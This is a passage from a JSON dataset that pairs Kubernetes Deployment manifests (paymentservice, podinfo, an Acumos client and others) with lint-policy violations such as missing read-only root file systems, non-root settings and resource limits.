    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: tuntsov/hipster-payment:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "2281",
    "manifest_path": "data/manifests/the_stack_sample/sample_0566.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: tuntsov/hipster-payment:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "2282",
    "manifest_path": "data/manifests/the_stack_sample/sample_0566.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: tuntsov/hipster-payment:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "2283",
    "manifest_path": "data/manifests/the_stack_sample/sample_0566.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: tuntsov/hipster-payment:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "2284",
    "manifest_path": "data/manifests/the_stack_sample/sample_0568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app\n  template:\n    metadata:\n      labels:\n        app: app\n    spec:\n      containers:\n      - name: app-api\n        image: gcr.io/google-samples/node-hello:1.0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app-api\" does not have a read-only root file system"
  },
  {
    "id": "2285",
    "manifest_path": "data/manifests/the_stack_sample/sample_0568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app\n  template:\n    metadata:\n      labels:\n        app: app\n    spec:\n      containers:\n      - name: app-api\n        image: gcr.io/google-samples/node-hello:1.0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app-api\" is not set to runAsNonRoot"
  },
  {
    "id": "2286",
    "manifest_path": "data/manifests/the_stack_sample/sample_0568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app\n  template:\n    metadata:\n      labels:\n        app: app\n    spec:\n      containers:\n      - name: app-api\n        image: gcr.io/google-samples/node-hello:1.0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app-api\" has cpu request 0"
  },
  {
    "id": "2287",
    "manifest_path": "data/manifests/the_stack_sample/sample_0568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app\n  template:\n    metadata:\n      labels:\n        app: app\n    spec:\n      containers:\n      - name: app-api\n        image: gcr.io/google-samples/node-hello:1.0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app-api\" has memory limit 0"
  },
  {
    "id": "2288",
    "manifest_path": "data/manifests/the_stack_sample/sample_0570.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: glob:1.4.*\n    flux.weave.works/tag.podinfod: glob:1.4.*\n    flux.weave.works/locked: 'true'\n    flux.weave.works/locked_msg: 1.4.2 does not work for us\n    flux.weave.works/locked_user: \"Changyu Seon (\\u1109\\u1165\\u11AB\\u110E\\u1161\\u11AB\\\n      \\u1100\\u1172) <changyu.seon@bespinglobal.com>\"\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.4.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "2289",
    "manifest_path": "data/manifests/the_stack_sample/sample_0570.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: glob:1.4.*\n    flux.weave.works/tag.podinfod: glob:1.4.*\n    flux.weave.works/locked: 'true'\n    flux.weave.works/locked_msg: 1.4.2 does not work for us\n    flux.weave.works/locked_user: \"Changyu Seon (\\u1109\\u1165\\u11AB\\u110E\\u1161\\u11AB\\\n      \\u1100\\u1172) <changyu.seon@bespinglobal.com>\"\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.4.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "2290",
    "manifest_path": "data/manifests/the_stack_sample/sample_0570.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: glob:1.4.*\n    flux.weave.works/tag.podinfod: glob:1.4.*\n    flux.weave.works/locked: 'true'\n    flux.weave.works/locked_msg: 1.4.2 does not work for us\n    flux.weave.works/locked_user: \"Changyu Seon (\\u1109\\u1165\\u11AB\\u110E\\u1161\\u11AB\\\n      \\u1100\\u1172) <changyu.seon@bespinglobal.com>\"\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.4.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "2291",
    "manifest_path": "data/manifests/the_stack_sample/sample_0570.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: glob:1.4.*\n    flux.weave.works/tag.podinfod: glob:1.4.*\n    flux.weave.works/locked: 'true'\n    flux.weave.works/locked_msg: 1.4.2 does not work for us\n    flux.weave.works/locked_user: \"Changyu Seon (\\u1109\\u1165\\u11AB\\u110E\\u1161\\u11AB\\\n      \\u1100\\u1172) <changyu.seon@bespinglobal.com>\"\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.4.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "2292",
    "manifest_path": "data/manifests/the_stack_sample/sample_0570.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: glob:1.4.*\n    flux.weave.works/tag.podinfod: glob:1.4.*\n    flux.weave.works/locked: 'true'\n    flux.weave.works/locked_msg: 1.4.2 does not work for us\n    flux.weave.works/locked_user: \"Changyu Seon (\\u1109\\u1165\\u11AB\\u110E\\u1161\\u11AB\\\n      \\u1100\\u1172) <changyu.seon@bespinglobal.com>\"\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.4.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "2293",
    "manifest_path": "data/manifests/the_stack_sample/sample_0570.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: glob:1.4.*\n    flux.weave.works/tag.podinfod: glob:1.4.*\n    flux.weave.works/locked: 'true'\n    flux.weave.works/locked_msg: 1.4.2 does not work for us\n    flux.weave.works/locked_user: \"Changyu Seon (\\u1109\\u1165\\u11AB\\u110E\\u1161\\u11AB\\\n      \\u1100\\u1172) <changyu.seon@bespinglobal.com>\"\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.4.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "2294",
    "manifest_path": "data/manifests/the_stack_sample/sample_0572.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: kubernetes-client\n  labels:\n    app: kubernetes-client\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kubernetes-client\n  template:\n    metadata:\n      labels:\n        app: kubernetes-client\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: kubernetes-client\n        image: <KUBERNETES_CLIENT_IMAGE>\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - set -x; cd maven; java $JAVA_OPTS -Dhttp.proxyHost=$ACUMOS_HTTP_PROXY_HOST\n          -Dhttp.proxyPort=$ACUMOS_HTTP_PROXY_PORT -Dhttp.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS\n          -Dhttps.proxyHost=$ACUMOS_HTTP_PROXY_HOST -Dhttps.proxyPort=$ACUMOS_HTTP_PROXY_PORT\n          -Dhttps.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS -Djava.security.egd=file:/dev/./urandom\n          -jar *.jar\n        env:\n        - name: ACUMOS_HTTP_NON_PROXY_HOSTS\n          value: <ACUMOS_HTTP_NON_PROXY_HOSTS>|cds-service\n        - name: ACUMOS_HTTP_PROXY_HOST\n          value: <ACUMOS_HTTP_PROXY_HOST>\n        - name: ACUMOS_HTTP_PROXY_PORT\n          value: <ACUMOS_HTTP_PROXY_PORT>\n        - name: JAVA_OPTS\n          value: -Xms128m -Xmx512m\n        - name: SPRING_APPLICATION_JSON\n          value: '{ \"logging\": { \"level\": { \"root\": \"INFO\" } }, \"kube\" : { \"incrementPort\":\n            \"8557\", \"singleModelPort\": \"8556\", \"folderPath\": \"/maven/home\", \"singleNodePort\":\n            \"30333\", \"singleTargetPort\": \"8061\", \"dataBrokerModelPort\": \"8556\", \"dataBrokerNodePort\":\n            \"30556\", \"dataBrokerTargetPort\": \"8556\", \"mlTargetPort\": \"8061\", \"nginxImageName\":\n            \"nginx\", \"nexusEndPointURL\": \"http://localhost:80\" }, \"dockerproxy\": {\n            \"host\": \"<ACUMOS_DOCKER_PROXY_HOST>\", \"port\": \"<ACUMOS_DOCKER_PROXY_PORT>\"\n            }, \"blueprint\": { \"ImageName\": \"<BLUEPRINT_ORCHESTRATOR_IMAGE>\", \"name\":\n            \"blueprint-orchestrator\", \"nodePort\": \"30555\", \"port\": \"8061\" }, \"nexus\":\n            { \"url\": \"http://<ACUMOS_NEXUS_HOST>:<ACUMOS_NEXUS_API_PORT>/<ACUMOS_NEXUS_MAVEN_REPO_PATH>/<ACUMOS_NEXUS_MAVEN_REPO>/\",\n            \"password\": \"<ACUMOS_NEXUS_RW_USER_PASSWORD>\", \"username\": \"<ACUMOS_NEXUS_RW_USER>\",\n            \"groupid\": \"<ACUMOS_NEXUS_GROUP>\" }, \"cmndatasvc\": { \"cmndatasvcendpointurl\":\n            \"http://<ACUMOS_CDS_HOST>:<ACUMOS_CDS_PORT>/ccds\", \"cmndatasvcuser\": \"<ACUMOS_CDS_USER>\",\n            \"cmndatasvcpwd\": \"<ACUMOS_CDS_PASSWORD>\" }, \"probe\": { \"probeImageName\":\n            \"<PROTO_VIEWER_IMAGE>\", \"probeImagePORT\": \"5006\", \"probeModelPort\": \"5006\",\n            \"probeNodePort\": \"30800\", \"probeTargetPort\": \"5006\", \"probeApiPort\": \"5006\",\n            \"probeExternalPort\": \"30800\", \"probeSchemaPort\": \"80\" }, \"logstash\": {\n            \"host\": \"<ACUMOS_ELK_HOST>\", \"ip\": \"<ACUMOS_ELK_HOST_IP>\", \"port\": \"<ACUMOS_ELK_LOGSTASH_PORT>\"\n            }, \"server\": { \"port\": \"8082\" } }'\n        ports:\n        - containerPort: 8082\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kubernetes-client\" is using an invalid container image, \"<KUBERNETES_CLIENT_IMAGE>\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2295",
    "manifest_path": "data/manifests/the_stack_sample/sample_0572.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: kubernetes-client\n  labels:\n    app: kubernetes-client\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kubernetes-client\n  template:\n    metadata:\n      labels:\n        app: kubernetes-client\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: kubernetes-client\n        image: <KUBERNETES_CLIENT_IMAGE>\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - set -x; cd maven; java $JAVA_OPTS -Dhttp.proxyHost=$ACUMOS_HTTP_PROXY_HOST\n          -Dhttp.proxyPort=$ACUMOS_HTTP_PROXY_PORT -Dhttp.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS\n          -Dhttps.proxyHost=$ACUMOS_HTTP_PROXY_HOST -Dhttps.proxyPort=$ACUMOS_HTTP_PROXY_PORT\n          -Dhttps.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS -Djava.security.egd=file:/dev/./urandom\n          -jar *.jar\n        env:\n        - name: ACUMOS_HTTP_NON_PROXY_HOSTS\n          value: <ACUMOS_HTTP_NON_PROXY_HOSTS>|cds-service\n        - name: ACUMOS_HTTP_PROXY_HOST\n          value: <ACUMOS_HTTP_PROXY_HOST>\n        - name: ACUMOS_HTTP_PROXY_PORT\n          value: <ACUMOS_HTTP_PROXY_PORT>\n        - name: JAVA_OPTS\n          value: -Xms128m -Xmx512m\n        - name: SPRING_APPLICATION_JSON\n          value: '{ \"logging\": { \"level\": { \"root\": \"INFO\" } }, \"kube\" : { \"incrementPort\":\n            \"8557\", \"singleModelPort\": \"8556\", \"folderPath\": \"/maven/home\", \"singleNodePort\":\n            \"30333\", \"singleTargetPort\": \"8061\", \"dataBrokerModelPort\": \"8556\", \"dataBrokerNodePort\":\n            \"30556\", \"dataBrokerTargetPort\": \"8556\", \"mlTargetPort\": \"8061\", \"nginxImageName\":\n            \"nginx\", \"nexusEndPointURL\": \"http://localhost:80\" }, \"dockerproxy\": {\n            \"host\": \"<ACUMOS_DOCKER_PROXY_HOST>\", \"port\": \"<ACUMOS_DOCKER_PROXY_PORT>\"\n            }, \"blueprint\": { \"ImageName\": \"<BLUEPRINT_ORCHESTRATOR_IMAGE>\", \"name\":\n            \"blueprint-orchestrator\", \"nodePort\": \"30555\", \"port\": \"8061\" }, \"nexus\":\n            { \"url\": \"http://<ACUMOS_NEXUS_HOST>:<ACUMOS_NEXUS_API_PORT>/<ACUMOS_NEXUS_MAVEN_REPO_PATH>/<ACUMOS_NEXUS_MAVEN_REPO>/\",\n            \"password\": \"<ACUMOS_NEXUS_RW_USER_PASSWORD>\", \"username\": \"<ACUMOS_NEXUS_RW_USER>\",\n            \"groupid\": \"<ACUMOS_NEXUS_GROUP>\" }, \"cmndatasvc\": { \"cmndatasvcendpointurl\":\n            \"http://<ACUMOS_CDS_HOST>:<ACUMOS_CDS_PORT>/ccds\", \"cmndatasvcuser\": \"<ACUMOS_CDS_USER>\",\n            \"cmndatasvcpwd\": \"<ACUMOS_CDS_PASSWORD>\" }, \"probe\": { \"probeImageName\":\n            \"<PROTO_VIEWER_IMAGE>\", \"probeImagePORT\": \"5006\", \"probeModelPort\": \"5006\",\n            \"probeNodePort\": \"30800\", \"probeTargetPort\": \"5006\", \"probeApiPort\": \"5006\",\n            \"probeExternalPort\": \"30800\", \"probeSchemaPort\": \"80\" }, \"logstash\": {\n            \"host\": \"<ACUMOS_ELK_HOST>\", \"ip\": \"<ACUMOS_ELK_HOST_IP>\", \"port\": \"<ACUMOS_ELK_LOGSTASH_PORT>\"\n            }, \"server\": { \"port\": \"8082\" } }'\n        ports:\n        - containerPort: 8082\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kubernetes-client\" does not have a read-only root file system"
  },
  {
    "id": "2296",
    "manifest_path": "data/manifests/the_stack_sample/sample_0572.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: kubernetes-client\n  labels:\n    app: kubernetes-client\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kubernetes-client\n  template:\n    metadata:\n      labels:\n        app: kubernetes-client\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: kubernetes-client\n        image: <KUBERNETES_CLIENT_IMAGE>\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - set -x; cd maven; java $JAVA_OPTS -Dhttp.proxyHost=$ACUMOS_HTTP_PROXY_HOST\n          -Dhttp.proxyPort=$ACUMOS_HTTP_PROXY_PORT -Dhttp.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS\n          -Dhttps.proxyHost=$ACUMOS_HTTP_PROXY_HOST -Dhttps.proxyPort=$ACUMOS_HTTP_PROXY_PORT\n          -Dhttps.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS -Djava.security.egd=file:/dev/./urandom\n          -jar *.jar\n        env:\n        - name: ACUMOS_HTTP_NON_PROXY_HOSTS\n          value: <ACUMOS_HTTP_NON_PROXY_HOSTS>|cds-service\n        - name: ACUMOS_HTTP_PROXY_HOST\n          value: <ACUMOS_HTTP_PROXY_HOST>\n        - name: ACUMOS_HTTP_PROXY_PORT\n          value: <ACUMOS_HTTP_PROXY_PORT>\n        - name: JAVA_OPTS\n          value: -Xms128m -Xmx512m\n        - name: SPRING_APPLICATION_JSON\n          value: '{ \"logging\": { \"level\": { \"root\": \"INFO\" } }, \"kube\" : { \"incrementPort\":\n            \"8557\", \"singleModelPort\": \"8556\", \"folderPath\": \"/maven/home\", \"singleNodePort\":\n            \"30333\", \"singleTargetPort\": \"8061\", \"dataBrokerModelPort\": \"8556\", \"dataBrokerNodePort\":\n            \"30556\", \"dataBrokerTargetPort\": \"8556\", \"mlTargetPort\": \"8061\", \"nginxImageName\":\n            \"nginx\", \"nexusEndPointURL\": \"http://localhost:80\" }, \"dockerproxy\": {\n            \"host\": \"<ACUMOS_DOCKER_PROXY_HOST>\", \"port\": \"<ACUMOS_DOCKER_PROXY_PORT>\"\n            }, \"blueprint\": { \"ImageName\": \"<BLUEPRINT_ORCHESTRATOR_IMAGE>\", \"name\":\n            \"blueprint-orchestrator\", \"nodePort\": \"30555\", \"port\": \"8061\" }, \"nexus\":\n            { \"url\": \"http://<ACUMOS_NEXUS_HOST>:<ACUMOS_NEXUS_API_PORT>/<ACUMOS_NEXUS_MAVEN_REPO_PATH>/<ACUMOS_NEXUS_MAVEN_REPO>/\",\n            \"password\": \"<ACUMOS_NEXUS_RW_USER_PASSWORD>\", \"username\": \"<ACUMOS_NEXUS_RW_USER>\",\n            \"groupid\": \"<ACUMOS_NEXUS_GROUP>\" }, \"cmndatasvc\": { \"cmndatasvcendpointurl\":\n            \"http://<ACUMOS_CDS_HOST>:<ACUMOS_CDS_PORT>/ccds\", \"cmndatasvcuser\": \"<ACUMOS_CDS_USER>\",\n            \"cmndatasvcpwd\": \"<ACUMOS_CDS_PASSWORD>\" }, \"probe\": { \"probeImageName\":\n            \"<PROTO_VIEWER_IMAGE>\", \"probeImagePORT\": \"5006\", \"probeModelPort\": \"5006\",\n            \"probeNodePort\": \"30800\", \"probeTargetPort\": \"5006\", \"probeApiPort\": \"5006\",\n            \"probeExternalPort\": \"30800\", \"probeSchemaPort\": \"80\" }, \"logstash\": {\n            \"host\": \"<ACUMOS_ELK_HOST>\", \"ip\": \"<ACUMOS_ELK_HOST_IP>\", \"port\": \"<ACUMOS_ELK_LOGSTASH_PORT>\"\n            }, \"server\": { \"port\": \"8082\" } }'\n        ports:\n        - containerPort: 8082\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n",
    "policy_id": "run-as-non-root",
